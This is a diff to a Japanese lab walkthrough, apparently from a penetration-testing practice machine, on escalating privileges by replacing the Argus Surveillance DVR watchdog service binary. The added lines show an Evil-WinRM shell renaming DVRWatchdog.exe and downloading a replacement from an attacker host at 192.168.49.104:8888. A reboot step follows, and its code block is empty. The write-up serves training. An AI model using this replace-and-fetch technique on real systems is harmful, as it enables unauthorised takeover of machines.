@@ -30,7 +30,13 @@ DVRWatchdog.exe BUILTIN\Users:(I)(F)
 ```
 
 - バックアップを移動したうえで、ファイルをダウンロード
-```sh
+```powershell
+*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR> mv DVRWatchdog.exe ~/DVRWatchdog.exe.bkup
+*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR>iwr -uri http://192.168.49.104:8888/DVRWatchdog.exe -OutFile .\DVRWatchdog.exe
+```
+
+- マシンを最起動
+```powershell
 
 ```
 
